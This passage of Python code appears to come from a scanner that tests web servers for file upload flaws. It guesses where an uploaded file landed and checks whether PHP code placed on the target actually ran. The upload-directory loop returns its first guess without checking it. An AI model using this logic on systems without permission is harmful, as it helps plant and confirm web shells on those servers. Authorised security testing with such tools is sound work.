            
            # Look for JSON response patterns
            json_patterns = [
                r'"url"\s*:\s*"([^"]+)"',
                r'"file"\s*:\s*"([^"]+)"',
                r'"path"\s*:\s*"([^"]+)"',
                r'"src"\s*:\s*"([^"]+)"',
                r'"location"\s*:\s*"([^"]+)"'
            ]
            
            for pattern in json_patterns:
                match = re.search(pattern, response_text)
                if match:
                    url = match.group(1)
                    # Check if this URL might be related to our file
                    if filename_noext.lower() in url.lower() or '/upload' in url or '/file' in url:
                        return urljoin(base_url, url)
            
            # Look for plaintext URLs
            url_pattern = r'https?://[^\s<>"\']+\b'
            urls = re.findall(url_pattern, response_text)
            
            for url in urls:
                if filename_noext.lower() in url.lower() or '/upload' in url or '/file' in url:
                    return url
            
            # Check for common upload directory patterns
            parsed_base = urlparse(base_url)
            base_domain = f"{parsed_base.scheme}://{parsed_base.netloc}"
            
            upload_dirs = [
                '/uploads/', '/upload/', '/files/', '/file/', '/attachments/',
                '/images/', '/img/', '/media/', '/static/', '/assets/',
                '/content/', '/data/', '/documents/', '/temp/'
            ]
            
            for upload_dir in upload_dirs:
                potential_url = f"{base_domain}{upload_dir}{filename}"
                
                # This is just a guess, the file might actually be there
                return potential_url
        
        except Exception as e:
            print(f"Error extracting upload URL: {str(e)}")
        
        return None
    
    async def _check_file_executed(self, url: str, marker: str, semaphore: asyncio.Semaphore) -> bool:
        """
        Check if the uploaded file is accessible and if PHP code was executed.
        
        Args:
            url: The URL of the uploaded file
            marker: The marker string to look for in the response
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            True if the file was executed, False otherwise
        """
        try:
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check if our marker is in the response, which would indicate successful execution
                            if marker in content:
                                return True
                            
                            # Also check if PHP tags are visible in the response, which would indicate not executed
                            if '<?php' in content:
                                return False
                            
                            # If neither condition is met, we can't determine for sure
                            return False
        
        except Exception:
            return False 